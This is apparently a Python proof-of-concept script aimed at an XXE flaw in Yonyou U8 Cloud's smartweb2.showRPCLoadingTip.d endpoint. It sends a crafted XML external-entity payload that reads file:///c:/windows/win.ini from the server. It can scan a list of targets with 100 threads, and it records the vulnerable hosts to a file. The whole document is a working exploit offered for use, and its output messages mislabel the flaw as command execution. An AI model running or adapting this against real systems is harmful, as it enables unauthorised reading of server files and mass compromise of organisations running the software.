import argparse,sys,requests
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞   
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file file.txt.path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip().replace('\n','')
                if 'https://' in i: #给资产自动添加http://
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = "/hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1"
    url = target + payload_url
    header = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "Connection": "close"
        }
    data =  {"__type": "updateData", "__viewInstanceId": "nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel", "__xml": "<!DOCTYPE z [<!ENTITY test  SYSTEM \"file:///c:/windows/win.ini\" >]><rpc transaction=\"1\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"1\" state=\"insert\"><n><v>1</v></n></r></rs></data><vps><p name=\"__profileKeys\">&test;</p></vps></rpc>\r\n\r\n"}
    
    try:
        res1 = requests.get(url=target,verify=False)
        res2 = requests.post(url=url, headers=header,data=data,verify=False)
        if res1.status_code == 200:
            if res2.status_code == 200 and "<![CDATA[]]>" in res2.text:
                print(f'{GREEN}[+] 该url{target}存在命令执行漏洞{RESET}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点{target}不存在命令执行漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()